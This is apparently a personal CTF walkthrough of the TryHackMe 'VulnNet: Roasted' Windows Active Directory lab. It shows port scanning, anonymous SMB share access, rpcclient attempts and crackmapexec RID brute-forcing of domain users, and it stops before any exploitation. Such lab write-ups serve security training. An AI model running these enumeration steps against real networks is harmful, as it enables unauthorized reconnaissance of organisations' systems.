---
VulnNet Entertainment quickly deployed another management instance on their very broad network...
---

### VulnNet: Roasted

 Start Machine

VulnNet Entertainment just deployed a new instance on their network with the newly-hired system administrators. Being a security-aware company, they as always hired you to perform a penetration test, and see how system administrators are performing.  

-   Difficulty: Easy
-   Operating System: Windows  
    

This is a much simpler machine, do not overthink. You can do it by following common methodologies.

Note: It _might_ take up to 6 minutes for this machine to fully boot.

Icon made by [DinosoftLabs](https://www.flaticon.com/authors/dinosoftlabs) from [www.flaticon.com](https://www.flaticon.com/)

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.60.167 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.60.167:53
Open 10.10.60.167:88
Open 10.10.60.167:135
Open 10.10.60.167:139
Open 10.10.60.167:389
Open 10.10.60.167:445
Open 10.10.60.167:464
Open 10.10.60.167:593
Open 10.10.60.167:636
Open 10.10.60.167:3269
Open 10.10.60.167:3268
Open 10.10.60.167:5985
Open 10.10.60.167:9389
Open 10.10.60.167:49665
Open 10.10.60.167:49669
Open 10.10.60.167:49670
Open 10.10.60.167:49672
Open 10.10.60.167:49703
Open 10.10.60.167:49790
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 22:24 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:24
Completed NSE at 22:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:24
Completed NSE at 22:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:24
Completed NSE at 22:24, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 22:24
Completed Parallel DNS resolution of 1 host. at 22:24, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:24
Scanning 10.10.60.167 [19 ports]
Discovered open port 139/tcp on 10.10.60.167
Discovered open port 135/tcp on 10.10.60.167
Discovered open port 53/tcp on 10.10.60.167
Discovered open port 445/tcp on 10.10.60.167
Discovered open port 389/tcp on 10.10.60.167
Discovered open port 88/tcp on 10.10.60.167
Discovered open port 3269/tcp on 10.10.60.167
Discovered open port 49669/tcp on 10.10.60.167
Discovered open port 9389/tcp on 10.10.60.167
Discovered open port 49790/tcp on 10.10.60.167
Discovered open port 464/tcp on 10.10.60.167
Discovered open port 49670/tcp on 10.10.60.167
Discovered open port 636/tcp on 10.10.60.167
Discovered open port 49665/tcp on 10.10.60.167
Discovered open port 49672/tcp on 10.10.60.167
Discovered open port 49703/tcp on 10.10.60.167
Discovered open port 5985/tcp on 10.10.60.167
Discovered open port 593/tcp on 10.10.60.167
Discovered open port 3268/tcp on 10.10.60.167
Completed Connect Scan at 22:24, 0.50s elapsed (19 total ports)
Initiating Service scan at 22:24
Scanning 19 services on 10.10.60.167
Completed Service scan at 22:25, 57.96s elapsed (19 services on 1 host)
NSE: Script scanning 10.10.60.167.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:25
NSE Timing: About 99.96% done; ETC: 22:26 (0:00:00 remaining)
Completed NSE at 22:26, 40.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 14.45s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
Nmap scan report for 10.10.60.167
Host is up, received user-set (0.25s latency).
Scanned at 2022-12-29 22:24:51 EST for 113s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-12-30 03:24:59Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack Microsoft Windows RPC
49790/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32166/tcp): CLEAN (Timeout)
|   Check 2 (port 50927/tcp): CLEAN (Timeout)
|   Check 3 (port 22994/udp): CLEAN (Timeout)
|   Check 4 (port 9159/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
| smb2-time: 
|   date: 2022-12-30T03:25:53
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.17 seconds

Domain: vulnnet-rst.local

Starting with the Samba shares, we can use smbclient to list the network shares

┌──(kali㉿kali)-[~]
└─$ smbclient -N -L 10.10.60.167

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.60.167 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

smbmap will also reveal the permissions

┌──(kali㉿kali)-[~]
└─$ smbmap -u anonymous -H 10.10.60.167 
[+] Guest session       IP: 10.10.60.167:445    Name: 10.10.60.167                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing

getting files

┌──(kali㉿kali)-[~/VulnNet]
└─$ smbclient -N \\\\10.10.60.167\\VulnNet-Business-Anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4554468 blocks available
smb: \> get Business-Manager.txt 
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> get Business-Sections.txt 
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> get Business-Tracking.txt 
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> quit

┌──(kali㉿kali)-[~/VulnNet]
└─$ smbclient -N \\\\10.10.60.167\\VulnNet-Enterprise-Anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 12 21:46:40 2021
  ..                                  D        0  Fri Mar 12 21:46:40 2021
  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021

                8771839 blocks of size 4096. 4554452 blocks available
smb: \> get Enterprise-Operations.txt 
getting file \Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> get Enterprise-Safety.txt 
getting file \Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> get Enterprise-Sync.txt 
getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> quit


┌──(kali㉿kali)-[~/VulnNet]
└─$ cat Business-Manager.txt 
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her. 
We understand that when you’ve got questions, especially when you’re on a tight proposal deadline, you NEED answers. 
Our customer happiness specialists are at the ready, armed with friendly, helpful, timely support by email or online messaging.
We’re here to help, regardless of which you plan you’re on or if you’re just taking us for a test drive.
Our company looks forward to all of the business proposals, we will do our best to evaluate all of your offers properly. 
To contact our core business manager call this number: 1337 0000 7331

~VulnNet Entertainment
~TryHackMe
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ cat Business-Sections.txt 
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Jack Goldenhand is the person you should reach to for any business unrelated proposals.
Managing proposals is a breeze with VulnNet. We save all your case studies, fees, images and team bios all in one central library.
Tag them, search them and drop them into your layout. Proposals just got... dare we say... fun?
No more emailing big PDFs, printing and shipping proposals or faxing back signatures (ugh).
Your client gets a branded, interactive proposal they can sign off electronically. No need for extra software or logins.
Oh, and we tell you as soon as your client opens it.

~VulnNet Entertainment
~TryHackMe
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ cat Business-Tracking.txt 
VULNNET TRACKING
~~~~~~~~~~~~~~~~~~

Keep a pulse on your sales pipeline of your agency. We let you know your close rate,
which sections of your proposals get viewed and for how long,
and all kinds of insight into what goes into your most successful proposals so you can sell smarter.
We keep track of all necessary activities and reach back to you with newly gathered data to discuss the outcome. 
You won't miss anything ever again. 

~VulnNet Entertainment
~TryHackMe
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ cat Enterprise-Operations.txt 
VULNNET OPERATIONS
~~~~~~~~~~~~~~~~~~~~

We bring predictability and consistency to your process. Making it repetitive doesn’t make it boring. 
Set the direction, define roles, and rely on automation to keep reps focused and make onboarding a breeze.
Don't wait for an opportunity to knock - build the door. Contact us right now.
VulnNet Entertainment is fully commited to growth, security and improvement.
Make a right decision!

~VulnNet Entertainment
~TryHackMe
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ cat Enterprise-Safety.txt    
VULNNET SAFETY
~~~~~~~~~~~~~~~~

Tony Skid is a core security manager and takes care of internal infrastructure.
We keep your data safe and private. When it comes to protecting your private information...
we’ve got it locked down tighter than Alcatraz. 
We partner with TryHackMe, use 128-bit SSL encryption, and create daily backups. 
And we never, EVER disclose any data to third-parties without your permission. 
Rest easy, nothing’s getting out of here alive.

~VulnNet Entertainment
~TryHackMe
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ cat Enterprise-Sync.txt  
VULNNET SYNC
~~~~~~~~~~~~~~

Johnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.
Proposals are just one part of your agency sales process. We tie together your other software, so you can import contacts from your CRM,
auto create deals and generate invoices in your accounting software. We are regularly adding new integrations.
Say no more to desync problems.
To contact our sync manager call this number: 7331 0000 1337

~VulnNet Entertainment
~TryHackMe


just for me

──(kali㉿kali)-[~/VulnNet]
└─$ pip3 install kerbrute
Defaulting to user installation because normal site-packages is not writeable
Collecting kerbrute
  Downloading kerbrute-0.0.2-py3-none-any.whl (17 kB)
Requirement already satisfied: impacket in /usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg (from kerbrute) (0.9.24.dev1+20210704.162046.29ad5792)
Requirement already satisfied: chardet in /home/kali/.local/lib/python3.10/site-packages (from impacket->kerbrute) (5.0.0)
Requirement already satisfied: flask>=1.0 in /usr/lib/python3/dist-packages (from impacket->kerbrute) (2.2.2)
Requirement already satisfied: future in /usr/lib/python3/dist-packages (from impacket->kerbrute) (0.18.2)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in /usr/lib/python3/dist-packages (from impacket->kerbrute) (2.9.1)
Requirement already satisfied: ldapdomaindump>=0.9.0 in /usr/lib/python3/dist-packages (from impacket->kerbrute) (0.9.3)
Requirement already satisfied: pyOpenSSL>=0.16.2 in /usr/lib/python3/dist-packages (from impacket->kerbrute) (21.0.0)
Requirement already satisfied: pyasn1>=0.2.3 in /usr/local/lib/python3.10/dist-packages (from impacket->kerbrute) (0.4.8)
Requirement already satisfied: pycryptodomex in /usr/lib/python3/dist-packages (from impacket->kerbrute) (3.11.0)
Requirement already satisfied: six in /usr/local/lib/python3.10/dist-packages (from impacket->kerbrute) (1.16.0)
Installing collected packages: kerbrute
  WARNING: The script kerbrute is installed in '/home/kali/.local/bin' which is not on PATH.
  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.                                                                                                         
Successfully installed kerbrute-0.0.2                                                                         
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ kerbrute
kerbrute: command not found
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
                                                                                                              
┌──(kali㉿kali)-[~/VulnNet]
└─$ export PATH=/home/kali/.local/bin:$PATH

https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration

rpcclient es una herramienta de línea de comandos que se utiliza para interactuar con servicios de Protocolo de Mensajería de Red (RPC, por sus siglas en inglés) en sistemas operativos basados en Unix. RPC es una tecnología que permite a los programas en diferentes sistemas operativos comunicarse entre sí a través de una red.

rpcclient se utiliza a menudo para probar y depurar servicios RPC, y también puede utilizarse para realizar tareas de administración de red y para explorar la información disponible en un servidor RPC. Para utilizar rpcclient, debe conocer el nombre del servicio RPC al que desea conectarse y el puerto en el que está escuchando el servicio.

Una vez que se ha conectado a un servidor RPC utilizando rpcclient, puede utilizar comandos para realizar diferentes acciones, como listar los servicios disponibles, ver información sobre un servicio específico o realizar llamadas a procedimientos remotos.

En resumen, rpcclient es una herramienta útil para interactuar con servicios RPC y realizar tareas de administración de red en sistemas operativos basados en Unix.

Active Directory es un servicio de directorio de Microsoft que se utiliza en redes empresariales para almacenar y gestionar información sobre usuarios, dispositivos y recursos de la red. Active Directory utiliza el Protocolo de Mensajería de Red (RPC, por sus siglas en inglés) para permitir que los programas se comuniquen con el servicio de directorio y realicen tareas de administración de la red.

Para interactuar con Active Directory, puede utilizar diferentes herramientas y utilidades, como el Administrador de Active Directory, el Módulo de PowerShell para Active Directory o la herramienta de línea de comandos rpcclient. Estas herramientas le permiten realizar tareas de administración de la red, como agregar y eliminar usuarios, crear grupos y asignar permisos, y gestionar dispositivos y recursos de la red.

En resumen, Active Directory es un servicio de directorio que se utiliza en redes empresariales para almacenar y gestionar información sobre usuarios, dispositivos y recursos de la red. Puede utilizar herramientas como el Administrador de Active Directory, PowerShell o rpcclient para interactuar con Active Directory y realizar tareas de administración de la red.


┌──(kali㉿kali)-[~/VulnNet]
└─$ rpcclient -U "" 10.10.21.40
Password for [WORKGROUP\]:
rpcclient $> help
---------------         ----------------------
       UNIXINFO
       getpwuid         Get shell and homedir
       uidtosid         Convert uid to sid
---------------         ----------------------
         MDSSVC
fetch_properties                Fetch connection properties
fetch_attributes                Fetch attributes for a CNID
---------------         ----------------------
        CLUSAPI
clusapi_open_cluster            Open cluster
clusapi_get_cluster_name                Get cluster name
clusapi_get_cluster_version             Get cluster version
clusapi_get_quorum_resource             Get quorum resource
clusapi_create_enum             Create enum query
clusapi_create_enumex           Create enumex query
clusapi_open_resource           Open cluster resource
clusapi_online_resource         Set cluster resource online
clusapi_offline_resource                Set cluster resource offline
clusapi_get_resource_state              Get cluster resource state
clusapi_get_cluster_version2            Get cluster version2
clusapi_pause_node              Pause cluster node
clusapi_resume_node             Resume cluster node
---------------         ----------------------
        WITNESS
GetInterfaceList                List the interfaces to which witness client connections can be made
       Register         Register for resource state change notifications of a NetName and IPAddress
     UnRegister         Unregister for notifications from the server</para></listitem></varlistentry>
    AsyncNotify         Request notification of registered resource changes from the server
     RegisterEx         Register for resource state change notifications of a NetName, ShareName and multiple IPAddresses
---------------         ----------------------
          FSRVP
fss_is_path_sup         Check whether a share supports shadow-copy requests
fss_get_sup_version             Get supported FSRVP version from server
fss_create_expose               Request shadow-copy creation and exposure
     fss_delete         Request shadow-copy share deletion
fss_has_shadow_copy             Check for an associated share shadow-copy
fss_get_mapping         Get shadow-copy share mapping information
fss_recovery_complete           Flag read-write snapshot as recovery complete, allowing further shadow-copy requests
---------------         ----------------------
         WINREG
 winreg_enumkey         Enumerate Keys
querymultiplevalues             Query multiple values
querymultiplevalues2            Query multiple values
---------------         ----------------------
       EVENTLOG
eventlog_readlog                Read Eventlog
eventlog_numrecord              Get number of records
eventlog_oldestrecord           Get oldest record
eventlog_reportevent            Report event
eventlog_reporteventsource              Report event and source
eventlog_registerevsource               Register event source
eventlog_backuplog              Backup Eventlog File
eventlog_loginfo                Get Eventlog Information
---------------         ----------------------
        DRSUAPI
   dscracknames         Crack Name
    dsgetdcinfo         Get Domain Controller Info
 dsgetncchanges         Get NC Changes
dswriteaccountspn               Write Account SPN
---------------         ----------------------
         NTSVCS
ntsvcs_getversion               Query NTSVCS version
ntsvcs_validatedevinst          Query NTSVCS device instance
ntsvcs_hwprofflags              Query NTSVCS HW prof flags
ntsvcs_hwprofinfo               Query NTSVCS HW prof info
ntsvcs_getdevregprop            Query NTSVCS device registry property
ntsvcs_getdevlistsize           Query NTSVCS device list size
ntsvcs_getdevlist               Query NTSVCS device list
---------------         ----------------------
         WKSSVC
wkssvc_wkstagetinfo             Query WKSSVC Workstation Information
wkssvc_getjoininformation               Query WKSSVC Join Information
wkssvc_messagebuffersend                Send WKSSVC message
wkssvc_enumeratecomputernames           Enumerate WKSSVC computer names
wkssvc_enumerateusers           Enumerate WKSSVC users
---------------         ----------------------
       SHUTDOWN
---------------         ----------------------
       EPMAPPER
         epmmap         Map a binding
      epmlookup         Lookup bindings
---------------         ----------------------
           ECHO
     echoaddone         Add one to a number
       echodata         Echo data
       sinkdata         Sink data
     sourcedata         Source data
---------------         ----------------------
            DFS
     dfsversion         Query DFS support
         dfsadd         Add a DFS share
      dfsremove         Remove a DFS share
     dfsgetinfo         Query DFS share info
        dfsenum         Enumerate dfs shares
      dfsenumex         Enumerate dfs shares
---------------         ----------------------
         SRVSVC
        srvinfo         Server query info
   netshareenum         Enumerate shares
netshareenumall         Enumerate all shares
netsharegetinfo         Get Share Info
netsharesetinfo         Set Share Info
netsharesetdfsflags             Set DFS flags
    netfileenum         Enumerate open files
   netremotetod         Fetch remote time of day
netnamevalidate         Validate sharename
  netfilegetsec         Get File security
     netsessdel         Delete Session
    netsessenum         Enumerate Sessions
    netdiskenum         Enumerate Disks
    netconnenum         Enumerate Connections
    netshareadd         Add share
    netsharedel         Delete share
---------------         ----------------------
       NETLOGON
     logonctrl2         Logon Control 2
   getanydcname         Get trusted DC name
      getdcname         Get trusted PDC name
  dsr_getdcname         Get trusted DC name
dsr_getdcnameex         Get trusted DC name
dsr_getdcnameex2                Get trusted DC name
dsr_getsitename         Get sitename
dsr_getforesttrustinfo          Get Forest Trust Info
      logonctrl         Logon Control
       samlogon         Sam Logon
change_trust_pw         Change Trust Account Password
    gettrustrid         Get trust rid
dsr_enumtrustdom                Enumerate trusted domains
dsenumdomtrusts         Enumerate all trusted domains in an AD forest
deregisterdnsrecords            Deregister DNS records
netrenumtrusteddomains          Enumerate trusted domains
netrenumtrusteddomainsex                Enumerate trusted domains
getdcsitecoverage               Get the Site-Coverage from a DC
   capabilities         Return Capabilities
logongetdomaininfo              Return LogonGetDomainInfo
---------------         ----------------------
IRemoteWinspool
winspool_AsyncOpenPrinter               Open printer handle
winspool_AsyncCorePrinterDriverInstalled                Query Core Printer Driver Installed
---------------         ----------------------
        SPOOLSS
      adddriver         Add a print driver
     addprinter         Add a printer
      deldriver         Delete a printer driver
    deldriverex         Delete a printer driver with files
       enumdata         Enumerate printer data
     enumdataex         Enumerate printer data for a key
        enumkey         Enumerate printer keys
       enumjobs         Enumerate print jobs
         getjob         Get print job
         setjob         Set print job
      enumports         Enumerate printer ports
    enumdrivers         Enumerate installed printer drivers
   enumprinters         Enumerate printers
        getdata         Get print driver data
      getdataex         Get printer driver data with keyname
      getdriver         Get print driver information
   getdriverdir         Get print driver upload directory
getdriverpackagepath            Get print driver package download directory
     getprinter         Get printer info
    openprinter         Open printer handle
 openprinter_ex         Open printer handle
      setdriver         Set printer driver
getprintprocdir         Get print processor directory
        addform         Add form
        setform         Set form
        getform         Get form
     deleteform         Delete form
      enumforms         Enumerate forms
     setprinter         Set printer comment
 setprintername         Set printername
 setprinterdata         Set REG_SZ printer data
       rffpcnex         Rffpcnex test
     printercmp         Printer comparison test
      enumprocs         Enumerate Print Processors
enumprocdatatypes               Enumerate Print Processor Data Types
   enummonitors         Enumerate Print Monitors
createprinteric         Create Printer IC
playgdiscriptonprinteric                Create Printer IC
getcoreprinterdrivers           Get CorePrinterDriver
enumpermachineconnections               Enumerate Per Machine Connections
addpermachineconnection         Add Per Machine Connection
delpermachineconnection         Delete Per Machine Connection
---------------         ----------------------
           SAMR
      queryuser         Query user info
     querygroup         Query group info
queryusergroups         Query user groups
queryuseraliases                Query user aliases
  querygroupmem         Query group membership
  queryaliasmem         Query alias membership
 queryaliasinfo         Query alias info
    deletealias         Delete an alias
  querydispinfo         Query display info
 querydispinfo2         Query display info
 querydispinfo3         Query display info
   querydominfo         Query domain info
   enumdomusers         Enumerate domain users
  enumdomgroups         Enumerate domain groups
  enumalsgroups         Enumerate alias groups
    enumdomains         Enumerate domains
  createdomuser         Create domain user
 createdomgroup         Create domain group
 createdomalias         Create domain alias
 samlookupnames         Look up names
  samlookuprids         Look up names
 deletedomgroup         Delete domain group
  deletedomuser         Delete domain user
 samquerysecobj         Query SAMR security object
   getdompwinfo         Retrieve domain password info
getusrdompwinfo         Retrieve user domain password info
   lookupdomain         Lookup Domain Name
      chgpasswd         Change user password
     chgpasswd2         Change user password
     chgpasswd3         Change user password
     chgpasswd4         Change user password
 getdispinfoidx         Get Display Information Index
    setuserinfo         Set user info
   setuserinfo2         Set user info2
---------------         ----------------------
      LSARPC-DS
  dsroledominfo         Get Primary Domain Information
---------------         ----------------------
         LSARPC
       lsaquery         Query info policy
     lookupsids         Convert SIDs to names
    lookupsids3         Convert SIDs to names
lookupsids_level                Convert SIDs to names
    lookupnames         Convert names to SIDs
   lookupnames4         Convert names to SIDs
lookupnames_level               Convert names to SIDs
      enumtrust         Enumerate trusted domains
      enumprivs         Enumerate privileges
    getdispname         Get the privilege name
     lsaenumsid         Enumerate the LSA SIDS
lsacreateaccount                Create a new lsa account
lsaenumprivsaccount             Enumerate the privileges of an SID
lsaenumacctrights               Enumerate the rights of an SID
     lsaaddpriv         Assign a privilege to a SID
     lsadelpriv         Revoke a privilege from a SID
lsaaddacctrights                Add rights to an account
lsaremoveacctrights             Remove rights from an account
lsalookupprivvalue              Get a privilege value given its name
 lsaquerysecobj         Query LSA security object
lsaquerytrustdominfo            Query LSA trusted domains info (given a SID)
lsaquerytrustdominfobyname              Query LSA trusted domains info (given a name), only works for Windows > 2k
lsaquerytrustdominfobysid               Query LSA trusted domains info (given a SID)
lsasettrustdominfo              Set LSA trusted domain info
    getusername         Get username
   createsecret         Create Secret
   deletesecret         Delete Secret
    querysecret         Query Secret
      setsecret         Set Secret
retrieveprivatedata             Retrieve Private Data
storeprivatedata                Store Private Data
 createtrustdom         Create Trusted Domain
 deletetrustdom         Delete Trusted Domain
---------------         ----------------------
GENERAL OPTIONS
           help         Get help on commands
              ?         Get help on commands
     debuglevel         Set debug level
          debug         Set debug level
           list         List available commands on <pipe>
           exit         Exit program
           quit         Exit program
           sign         Force RPC pipe connections to be signed
           seal         Force RPC pipe connections to be sealed
         packet         Force RPC pipe connections with packet authentication level
       schannel         Force RPC pipe connections to be sealed with 'schannel'. Assumes valid machine account to this domain controller.
   schannelsign         Force RPC pipe connections to be signed (not sealed) with 'schannel'.  Assumes valid machine account to this domain controller.
        timeout         Set timeout (in milliseconds) for RPC operations
      transport         Choose ncacn transport for RPC operations
           none         Force RPC pipe connections to have no special properties
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> quit

https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/

till tomorrow :) turuturu

https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#crackmapexec

As we have a read access to IPC$ without authentication, we are able to list the domain users as anonymous

IPC$ share[](#ipcusd-share)

From book **_Network Security Assessment 3rd edition_**

With an anonymous null session you can access the IPC$ share and interact with services exposed via named pipes. The enum4linux utility within Kali Linux is particularly useful; with it, you can obtain the following:

-   Operating system information
    

-   Details of the parent domain
    

-   A list of local users and groups
    

-   Details of available SMB shares
    

-   The effective system security policy


https://book.hacktricks.xyz/windows-hardening/ntlm


two ways to enum users(using crackmapexec and impacket (lookupsid.py))

┌──(kali㉿kali)-[~/VulnNet]
└─$ sudo crackmapexec smb 10.10.129.88 -u 'guest' -p '' --rid-brute
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\guest: 
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  [+] Brute forcing RIDs
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                                 
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)                                                                                                             
SMB         10.10.129.88    445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)                                                                                                            
